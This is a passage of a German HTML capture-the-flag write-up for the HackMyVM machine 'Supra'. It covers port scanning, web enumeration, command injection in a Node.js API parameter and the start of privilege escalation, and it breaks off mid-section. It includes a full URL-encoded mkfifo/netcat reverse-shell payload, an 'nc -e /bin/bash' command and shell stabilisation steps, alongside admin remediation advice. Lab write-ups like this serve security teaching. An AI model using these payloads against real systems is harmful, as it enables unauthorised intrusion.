@@ -1,0 +1,695 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supra - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Supra - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo (versucht)</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">cp (via socat)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (API Command Injection)</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> it404)</a></li>
+                <li><a href="#privilege-escalation-it404">Privilege Escalation (it404 -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.109	08:00:27:88:da:6f	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk nach aktiven Geräten zu durchsuchen, indem ARP-Anfragen gesendet werden.</p>
+             <p class="evaluation">**Bewertung:** Ein aktives Gerät mit der IP-Adresse `192.168.2.109` wurde identifiziert. Die MAC-Adresse `08:00:27:88:da:6f` (zugeordnet zu PCS Systemtechnik GmbH) deutet stark auf eine VirtualBox-VM hin. Dies ist unser Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die IP `192.168.2.109`. Führen Sie detaillierte Port-Scans (z.B. mit Nmap) auf diese IP durch, um offene Dienste zu identifizieren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Eine Segmentierung des Netzwerks kann die Sichtbarkeit von Hosts reduzieren, aber die Absicherung der Dienste selbst ist entscheidend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.109 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 14:46 CEST
+Nmap scan report for Supra (192.168.2.109)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 d97570c0724c4bdf665415e777374418 (RSA)
+|   256 3d4746104a5aeeb95f9461bd08ff7dbb (ECDSA)
+|_  256 bebc649ac4453283ed6c50c22aa1a9a4 (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.48 ((Debian))</span>
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.48 (Debian)
+<span class="command">4000/tcp open  http    Node.js (Express middleware)</span>
+|_http-title: NullTrace
+MAC Address: 08:00:27:88:DA:6F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms Supra (192.168.2.109)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds <span class="comment">(Scan time missing)</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Ein umfassender Nmap-Scan wird auf das Ziel `192.168.2.109` durchgeführt:
+*   `-sS`: TCP SYN Scan (Stealth Scan).
+*   `-sC`: Führt Standard-Nmap-Skripte aus.
+*   `-T5`: Sehr aggressives Timing für schnelleren Scan.
+*   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+*   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+             <p class="evaluation">**Bewertung:** Der Scan identifiziert drei offene TCP-Ports:
+*   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian. Ein moderner SSH-Server, aber immer ein potenzieller Vektor für Brute-Force oder Credential Stuffing.
+*   **Port 80 (HTTP):** Apache 2.4.48 auf Debian. Zeigt die Apache-Standardseite "It works". Potenziell uninteressant, aber weitere Enumeration ist nötig.
+*   **Port 4000 (HTTP):** Eine Node.js-Anwendung (mit Express Middleware), die eine Webseite mit dem Titel "NullTrace" bereitstellt. Dies ist ein ungewöhnlicher Port und eine benutzerdefinierte Anwendung, was ihn zu einem Hauptziel für weitere Untersuchungen macht.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  SSH (Port 22): Halten Sie nach möglichen Benutzernamen Ausschau und prüfen Sie auf schwache Passwörter, falls andere Angriffsvektoren fehlschlagen.
+    2.  HTTP (Port 80): Führen Sie Verzeichnis-Enumeration (z.B. mit Gobuster) durch, um zu sehen, ob mehr als die Standardseite vorhanden ist.
+    3.  HTTP (Port 4000): Konzentrieren Sie sich auf die Node.js-Anwendung. Führen Sie intensive Web-Enumeration durch (Verzeichnisse, Dateien, API-Endpunkte, Parameter). Untersuchen Sie die Funktionalität von "NullTrace".<br>
+**Empfehlung (Admin):** Stellen Sie sicher, dass alle Dienste aktuell und sicher konfiguriert sind. Beschränken Sie den Zugriff auf Dienste nur auf notwendige Netzwerke/Benutzer. Überwachen Sie insbesondere die benutzerdefinierte Node.js-Anwendung auf Port 4000 auf Schwachstellen und sichern Sie sie entsprechend ab.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.109 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.109
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:          200,204,301,302,307,401,403
+[+] User Agent:            gobuster/3.1.0
+[+] Extensions:            git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:              true
+[+] Timeout:               10s
+===============================================================
+[... Datum/Zeit ...] Starting gobuster
+===============================================================
+<span class="command">/.php</span>                 (Status: 403) [Size: 278] <span class="comment"><-- Verboten --></span>
+<span class="command">/.html</span>                (Status: 403) [Size: 278] <span class="comment"><-- Verboten --></span>
+<span class="command">/index.html</span>           (Status: 200) [Size: 10701] <span class="comment"><-- Apache Default Page --></span>
+<span class="command">/manual</span>               (Status: 301) [Size: 315] [--> http://192.168.2.109/manual/] <span class="comment"><-- Apache Manual? --></span>
+<span class="command">/javascript</span>           (Status: 301) [Size: 319] [--> http://192.168.2.109/javascript/] <span class="comment"><-- Standardverzeichnis? --></span>
+[... Weitere potentielle Funde nicht im Log ...]
+===============================================================
+[... Datum/Zeit ...] Finished
+===============================================================
+
+<span class="comment">stdout: 19dae824d646607aa5c762cb8148f0a6  /var/www/api/uploads/rev.php</span> <span class="comment"><-- Woher kommt diese Zeile? Nicht Teil von Gobuster. --></span>
+
+<span class="command">http://192.168.2.109:4000/uploads/..%2Fapp.js</span> <span class="comment"><-- Hinweis auf Path Traversal auf Port 4000 --></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Apache-Webserver (Port 80) zu finden. Es verwendet eine umfangreiche Liste von Dateiendungen (`-x`) und eine hohe Anzahl von Threads (`-t 100`). Die Ausgabe zeigt hauptsächlich Standardinhalte wie die Apache-Default-Seite (`index.html`) und das Apache-Manual (`/manual/`). Die Zeile `stdout: 19dae824d646607aa5c762cb8148f0a6 /var/www/api/uploads/rev.php` scheint nicht zur Gobuster-Ausgabe zu gehören und ihr Ursprung ist unklar – möglicherweise ein Überbleibsel eines anderen Befehls oder eine manuelle Notiz. Die URL `http://192.168.2.109:4000/uploads/..%2Fapp.js` ist ebenfalls eine separate Notiz und deutet auf eine gefundene Path-Traversal-Schwachstelle in der Node.js-Anwendung auf Port 4000 hin (`..%2F` ist URL-kodiert für `../`).</p>
+             <p class="evaluation">**Bewertung:** Der Apache auf Port 80 scheint wenig Angriffsfläche zu bieten (nur Standardinhalte gefunden). Die eigentliche Schwachstelle (Path Traversal) wurde in der Node.js-Anwendung auf Port 4000 entdeckt. Diese ermöglicht es, aus dem `/uploads`-Verzeichnis auszubrechen und Dateien im übergeordneten Verzeichnis zu lesen, hier `app.js` (vermutlich die Hauptdatei der Node.js-Anwendung).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie vorerst Port 80. Konzentrieren Sie sich auf Port 4000. Nutzen Sie die Path-Traversal-Schwachstelle, um sensible Dateien zu lesen:
+    *   Lesen Sie `app.js`, um die Funktionsweise der API und mögliche weitere Endpunkte oder Schwachstellen zu verstehen.
+    *   Versuchen Sie, andere wichtige Dateien zu lesen (z.B. `/etc/passwd`, Konfigurationsdateien, Logdateien) mittels `../`, `../../` etc.
+    *   Fuzzing nach weiteren verwundbaren Endpunkten oder Parametern auf Port 4000.<br>
+**Empfehlung (Admin):** Beheben Sie die Path-Traversal-Schwachstelle in der Node.js-Anwendung auf Port 4000 dringend! Validieren und sanitisieren Sie alle Benutzereingaben, insbesondere Dateipfade. Verwenden Sie Bibliotheken, die Path Traversal verhindern. Überprüfen Sie den Apache auf Port 80 und deaktivieren Sie das Manual (`/manual/`), falls es nicht benötigt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/File-System/BEX_common.txt -u "http://192.168.2.109:4000/uploads/FUZZ" --hc 404</span></div>
+                    <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against OpenSSL. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warnings.warn(WRONG_PYCURL_SSL_MSG)
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.109:4000/uploads/FUZZ
+Total requests: 71
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000071:   200        0 L      0 W        0 Ch        "default"</span> <span class="comment"><-- Einziger Treffer --></span>
+
+=====================================================================
+Total time: 0 seconds
+Processed Requests: 71
+Filtered Requests: 70
+Requests/sec.: 0
+
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool `wfuzz` wird verwendet, um nach existierenden Dateien oder Verzeichnissen direkt unterhalb von `/uploads` auf dem Node.js-Server (Port 4000) zu suchen. Es verwendet eine Wortliste (`BEX_common.txt`) als Payloads (`FUZZ`). `-c` aktiviert Farben in der Ausgabe. `--hc 404` filtert alle Antworten mit dem Statuscode 404 (Not Found) heraus.</p>
+             <p class="evaluation">**Bewertung:** Der Scan findet nur einen einzigen Eintrag namens `default`, der einen Statuscode 200 (OK) zurückgibt, aber keinen Inhalt hat (0 Lines, 0 Words, 0 Chars). Dies könnte ein Standardverzeichnis oder eine Standarddatei sein, scheint aber auf den ersten Blick nicht sehr nützlich.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Obwohl dieser spezifische Scan wenig ergab, ist Fuzzing von Parametern und Pfaden auf der API (Port 4000) weiterhin sinnvoll. Versuchen Sie Fuzzing auf anderen bekannten oder vermuteten Endpunkten, die möglicherweise durch die Analyse von `app.js` (mittels Path Traversal) gefunden wurden.<br>**Empfehlung (Admin):** Konfigurieren Sie die Node.js-Anwendung so, dass sie keine unnötigen Informationen preisgibt oder auf ungültige Anfragen mit generischen Fehlermeldungen antwortet, um Enumeration zu erschweren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://192.168.2.109:4000/internal-processes-v1-display</span>
+
+stdout: <span class="command">www-data    1186  0.0  0.0   2420   520 ?        S    09:21   0:00 /bin/sh -c ps aux | grep undefined</span>
+<span class="command">www-data    1188  0.0  0.0   6312   716 ?        S    09:21   0:00 grep undefined</span>
+ :: undefined</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Pentester ruft manuell den API-Endpunkt `/internal-processes-v1-display` auf dem Node.js-Server (Port 4000) auf. Die Antwort (`stdout: ...`) zeigt die Ausgabe eines Server-internen Befehls, der `ps aux | grep undefined` ausführt. Dies deutet darauf hin, dass dieser Endpunkt Serverprozesse anzeigt und möglicherweise einen Parameter erwartet, der hier fehlt (daher wird nach "undefined" gegrept).</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein hochkritischer Fund! Ein API-Endpunkt, der interne Prozessinformationen preisgibt, ist bereits ein Informationsleck. Die Tatsache, dass er scheinbar einen Befehl (`ps aux | grep ...`) ausführt, legt eine starke Vermutung nahe, dass dieser Endpunkt für Command Injection anfällig sein könnte.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie diesen Endpunkt weiter:
+    *   Versuchen Sie, einen Parameter zu finden, der den `grep`-Suchbegriff steuert (z.B. `?query=root`, `?search=bash`, `?uid=xyz`).
+    *   Testen Sie auf Command Injection, indem Sie versuchen, Befehlstrennungszeichen (wie `;`, `|`, `&&`, `||`, `` ` ``, `$()`) und nachfolgende Befehle in den vermuteten Parameter einzuschleusen.<br>
+**Empfehlung (Admin):** Entfernen oder sichern Sie diesen API-Endpunkt sofort! Er stellt ein massives Informationsleck und eine potenzielle RCE-Schwachstelle dar. Niemals sollten API-Endpunkte interne Systembefehle auf Basis von Benutzereingaben ausführen, ohne extrem sorgfältige Validierung und Sanitisierung (idealerweise sollte dies ganz vermieden werden).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://192.168.2.109:4000/internal-processes-v1-display?uid=id</span>
+
+stdout: [...] <span class="comment">(gekürzte Prozessliste)</span>
+<span class="command">www-data    1234  0.0  0.0   2420   572 ?        S    09:25   0:00 /bin/sh -c ps aux | grep id</span>
+<span class="command">www-data    1236  0.0  0.0   6180   712 ?        S    09:25   0:00 grep id</span>
+ :: id</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Pentester hat den Parameter `uid` identifiziert und ruft den Endpunkt nun mit `?uid=id` auf. Die Ausgabe zeigt, dass der Server jetzt `ps aux | grep id` ausführt. Dies bestätigt, dass der `uid`-Parameter direkt in den Shell-Befehl auf dem Server eingefügt wird.</p>
+              <p class="evaluation">**Bewertung:** Dies bestätigt die Command Injection Schwachstelle. Der Wert des `uid`-Parameters wird unsicher in einem Shell-Befehl verwendet. Der Angreifer kann nun beliebige Befehle einschleusen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die Schwachstelle aus, um eine Reverse Shell zu erhalten. Konstruieren Sie einen Payload für den `uid`-Parameter, der eine Verbindung zu Ihrem Listener aufbaut.<br>**Empfehlung (Admin):** Kritische Schwachstelle! Sofort beheben, indem Benutzereingaben niemals direkt in Shell-Befehle eingefügt werden. Nutzen Sie sichere Methoden zur Prozessabfrage oder führen Sie nur vordefinierte, harmlose Aktionen durch.</p>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (API Command Injection)</h2>
+            <p class="comment">**Kurzbeschreibung:** Die Node.js-Anwendung auf Port 4000 weist einen API-Endpunkt `/internal-processes-v1-display` auf. Dieser Endpunkt nimmt einen GET-Parameter `uid` entgegen und fügt dessen Wert unsicher in einen Shell-Befehl (`ps aux | grep [uid]`) ein. Dies ermöglicht einem Angreifer, durch Einschleusen von Shell-Metazeichen beliebige Befehle auf dem Server im Kontext des `www-data`-Benutzers auszuführen.</p>
+            <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 4000 des Zielsystems.</p>
+            <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+            <ol>
+                <li>Identifizieren des verwundbaren Endpunkts und Parameters (z.B. durch Analyse von `app.js` oder gezieltes Raten/Fuzzing): `http://192.168.2.109:4000/internal-processes-v1-display?uid=test`.</li>
+                <li>Bestätigen der Injection durch Beobachtung der Serverantwort oder Einfügen einfacher Befehle (z.B. `?uid=id; id`, `?uid=$(id)`).</li>
+                <li>Vorbereiten eines Reverse-Shell-Payloads. Da der Payload in einer URL übergeben wird, müssen Sonderzeichen URL-kodiert werden. Ein gängiger Payload ist: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Angreifer-IP] [Listener-Port] >/tmp/f`.</li>
+                <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine: `nc -lvnp [Listener-Port]`.</li>
+                <li>Senden des URL-kodierten Payloads an den verwundbaren Endpunkt über einen Browser oder `curl`.</li>
+            </ol>
+            <p class="comment">**Erwartetes Ergebnis:** Der Server führt den eingeschleusten Reverse-Shell-Befehl aus und verbindet sich zurück zum Netcat-Listener des Angreifers, wodurch eine Shell als `www-data` erlangt wird.</p>
+            <p class="comment">**Beweismittel:**</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://192.168.2.109:4000/internal-processes-v1-display?uid=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.153%209001%20%3E%2Ftmp%2Ff</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:** Dies ist die URL, die den Command-Injection-Exploit enthält.
+*   `?uid=...`: Der verwundbare Parameter.
+*   `rm%20%2Ftmp%2Ff`: URL-kodiert für `rm /tmp/f` (löscht alte Pipe, falls vorhanden).
+*   `%3B`: URL-kodiert für `;` (Befehlstrenner).
+*   `mkfifo%20%2Ftmp%2Ff`: URL-kodiert für `mkfifo /tmp/f` (erstellt eine Named Pipe).
+*   `%3B`: URL-kodiert für `;`.
+*   `cat%20%2Ftmp%2Ff`: URL-kodiert für `cat /tmp/f` (liest von der Pipe).
+*   `%7C`: URL-kodiert für `|` (leitet die Ausgabe von `cat` an den nächsten Befehl weiter).
+*   `%2Fbin%2Fsh%20-i`: URL-kodiert für `/bin/sh -i` (startet eine interaktive Shell).
+*   `2%3E%261`: URL-kodiert für `2>&1` (leitet Stderr auf Stdout um).
+*   `%7C`: URL-kodiert für `|`.
+*   `nc%20192.168.2.153%209001`: URL-kodiert für `nc 192.168.2.153 9001` (baut Verbindung zum Angreifer-Listener auf).
+*   `%3E%2Ftmp%2Ff`: URL-kodiert für `>/tmp/f` (leitet die Ausgabe von Netcat zurück in die Pipe, um die Verbindung offen zu halten).</p>
+             <p class="evaluation">**Bewertung:** Ein klassischer und effektiver Reverse-Shell-Payload, der für die Übergabe in einer URL korrekt kodiert wurde. Er nutzt eine Named Pipe (`/tmp/f`), um eine stabile interaktive Shell über `nc` zu ermöglichen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass der Listener auf `192.168.2.153:9001` läuft, bevor Sie diese URL aufrufen (z.B. mit `curl` oder im Browser).<br>**Empfehlung (Admin):** Beheben Sie die Command Injection Schwachstelle.</p>
+            <p class="comment">**Risikobewertung:** Hoch. Die Schwachstelle erlaubt entfernten Angreifern ohne Authentifizierung die Ausführung beliebiger Befehle auf dem Server im Kontext des Webserver-Benutzers (`www-data`), was zu einem vollständigen initialen Zugriff führt.</p>
+            <p class="comment">**Empfehlungen:** Siehe vorherige Admin-Empfehlungen zur Behebung der Command Injection.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Reverse Shell)</h2>
+            <p class="analysis">**Analyse:** Ausführung des im POC beschriebenen Command Injection Payloads, um eine Reverse Shell zu erhalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 44372</span> <span class="password"><-- Verbindung erhalten!</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener auf dem Angreifer-System (`192.168.2.153`, Port 9001) empfängt die eingehende Verbindung vom Zielsystem (`192.168.2.109`). Eine einfache `/bin/sh`-Shell wird präsentiert. Die Meldung "can't access tty; job control turned off" weist darauf hin, dass es sich um eine nicht-interaktive Shell ohne vollen Terminal-Support handelt.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der Command Injection Exploit hat funktioniert und eine Reverse Shell wurde etabliert. Der Angreifer hat nun initialen Zugriff auf das System als der Benutzer, unter dem die Node.js-Anwendung läuft (vermutlich `www-data`).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell, um volle Interaktivität zu erlangen (z.B. mit Python PTY Spawn). Führen Sie dann `id` aus, um den aktuellen Benutzer zu bestätigen.<br>**Empfehlung (Admin):** Command Injection Schwachstelle beheben. Analysieren Sie die Kompromittierung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment">*
+                                               Stabilisiere Reverse Shell
+=</span></pre>
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt">www-data@Supra:~/api$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">www-data@Supra:~/api$ <span class="command">^Z</span></div> <span class="comment"><-- Shell in den Hintergrund legen --></span>
+                    <div class="prompt">zsh: suspended  nc -lvnp 9001</div>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div> <span class="comment"><-- Lokales Terminal für PTY vorbereiten und Shell wieder in den Vordergrund holen --></span>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset <span class="comment"><-- Optional: Terminal zurücksetzen --></span></pre>
+                     <div class="prompt">www-data@Supra:~/api$ <span class="comment"># Stabile Shell!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene einfache Shell wird stabilisiert:
+1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine interaktive Bash-Shell mittels Python. Der Prompt ändert sich zu `www-data@Supra:~/api$`.
+2.  `export TERM=xterm`: Setzt die Terminal-Variable für korrekte Darstellung.
+3.  `^Z` (Strg+Z): Legt die aktuelle Shell (den `nc`-Prozess auf dem Angreifer-System) in den Hintergrund.
+4.  `stty raw -echo`: Konfiguriert das lokale Terminal des Angreifers so, dass Tastatureingaben direkt und ohne Echo weitergeleitet werden (wichtig für PTY-Shells).
+5.  `fg`: Holt den `nc`-Prozess (und damit die stabilisierte Shell) wieder in den Vordergrund.
+6.  `reset` (optional): Setzt das Terminal zurück, falls die Darstellung fehlerhaft ist.</p>
+              <p class="evaluation">**Bewertung:** Standardverfahren zur Stabilisierung einer einfachen Reverse Shell. Der Angreifer hat nun eine voll funktionsfähige interaktive Bash-Shell als Benutzer `www-data` auf dem Zielsystem.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beginnen Sie mit der Enumeration als `www-data`.<br>**Empfehlung (Admin):** Keine spezifische Aktion hier, außer der Behebung der ursprünglichen Schwachstelle.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">=
+                                Die Shell war scheisse deswegen habe ich eine neue aufgebaut:
+*</span> </pre>
+                    <div class="prompt">www-data@Supra:~/api$ <span class="command">ls</span></div>
+                    <pre>app.js	node_modules  package.json  package-lock.json  start.sh  uploads  views</pre>
+                     <div class="prompt">www-data@Supra:~/api$ <span class="command">nc -e /bin/bash 192.168.2.153 5555</span></div> <span class="comment"><-- Versuch, eine zweite Shell zu starten? --></span>
+                     <div class="prompt">www-data@Supra:~/api$ <span class="command">ls</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine Notiz besagt, dass die erste Shell "scheisse war" (möglicherweise instabil oder Probleme bei der Stabilisierung) und eine neue aufgebaut wurde. Der Befehl `nc -e /bin/bash 192.168.2.153 5555` versucht, eine weitere Reverse Shell zu starten, diesmal auf Port 5555. Die Option `-e` (execute) ist bei vielen modernen `nc`-Versionen aus Sicherheitsgründen nicht mehr verfügbar oder muss explizit einkompiliert werden.</p>
+             <p class="evaluation">**Bewertung:** Es ist unklar, ob der zweite Shell-Versuch erfolgreich war oder benötigt wurde. Die Stabilisierungsschritte für die erste Shell auf Port 9001 wurden jedoch gezeigt. Der Befehl `nc -e` funktioniert oft nicht mehr. Der Rest des Logs scheint sich auf die (möglicherweise zweite?) Shell zu beziehen, die stabilisiert wird.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie zuverlässige Methoden zur Shell-Stabilisierung (wie Python PTY) oder nutzen Sie stabilere Payloads/Tools (z.B. Meterpreter, wenn anwendbar). Wenn `nc -e` nicht funktioniert, verwenden Sie denselben Command-Injection-Trick erneut mit einem anderen Listener-Port oder alternative Reverse-Shell-Payloads.<br>**Empfehlung (Admin):** Entfernen Sie unnötige Netzwerk-Tools wie `nc` vom System, wenn sie nicht für administrative Zwecke benötigt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@Supra:~/api$ export TERM=xterm
+export TERM=xterm
+www-data@Supra:~/api$ ^Z
+zsh: suspended  nc -lvnp 9001 <span class="comment"><-- Fehlerhafte Kopie? Listener-Befehl hier? --></span>
+
+┌──(root㉿cyber)-[~]
+└─# stty raw -echo;fg
+[1]  + continued  nc -lvnp 9001 <span class="comment"><-- Fehlerhafte Kopie? Listener-Befehl hier? --></span>
+                               reset
+
+www-data@Supra:~/api$</span> </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Dieser Block scheint eine fehlerhafte Wiederholung der Shell-Stabilisierungsschritte zu sein, wobei fälschlicherweise der Listener-Befehl (`nc -lvnp 9001`) in die Ausgabe kopiert wurde.</p>
+              <p class="evaluation">**Bewertung:** Ignorieren Sie diesen Block als Duplikat/Fehler im Log. Die Shell wurde bereits zuvor stabilisiert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Achten Sie auf saubere Dokumentation während des Pentests.<br>**Empfehlung (Admin):** Keine.</p>
+        </section>
+
+        <section id="privilege-escalation-www-data">
+            <h2>Privilege Escalation (www-data -> it404)</h2>
+             <p class="analysis">**Analyse:** Enumeration als `www-data`, um Wege zur nächsten Eskalationsstufe zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@Supra:~$ <span class="command">cd /home</span></div>
+                    <div class="prompt">www-data@Supra:/home$ <span class="command">ls</span></div>
+                    <pre><span class="command">it404</span></pre>
+                    <div class="prompt">www-data@Supra:/home$ <span class="command">cd it404/</span></div>
+                    <div class="prompt">www-data@Supra:/home/it404$ <span class="command">ls</span></div>
+                    <pre><span class="command">local.txt</span></pre>
+                    <div class="prompt">www-data@Supra:/home/it404$ <span class="command">cat local.txt</span></div>
+                    <pre>cat: local.txt: <span class="password">Permission denied</span></pre>
+                    <div class="prompt">www-data@Supra:/home/it404$ <span class="command">sudo -l</span></div>
+                    <pre>bash: sudo: <span class="password">command not found</span></pre>
+                     <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:**
